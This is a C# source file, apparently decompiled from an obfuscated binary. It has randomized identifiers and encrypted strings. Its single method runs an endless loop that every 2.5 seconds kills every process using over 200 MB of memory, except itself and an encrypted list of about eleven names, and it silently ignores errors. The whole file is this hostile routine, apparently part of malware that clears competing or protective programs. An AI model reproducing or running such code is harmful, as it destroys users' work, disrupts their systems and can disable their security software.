using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace cmxGDwJsHiH;

public static class uCBLUMLogmvjCzai
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void EWqwKlEJxDtcW()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107407501)) && !process.ProcessName.Contains(getString_0(107407492)) && !process.ProcessName.Contains(getString_0(107407515)) && !process.ProcessName.Contains(getString_0(107407506)) && !process.ProcessName.Contains(getString_0(107407461)) && !process.ProcessName.Contains(getString_0(107407480)) && !process.ProcessName.Contains(getString_0(107407435)) && !process.ProcessName.Contains(getString_0(107407454)) && !process.ProcessName.Contains(getString_0(107407409)) && !process.ProcessName.Contains(getString_0(107407396)) && !process.ProcessName.Contains(getString_0(107407375)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static uCBLUMLogmvjCzai()
	{
		Strings.CreateGetStringDelegate(typeof(uCBLUMLogmvjCzai));
	}
}
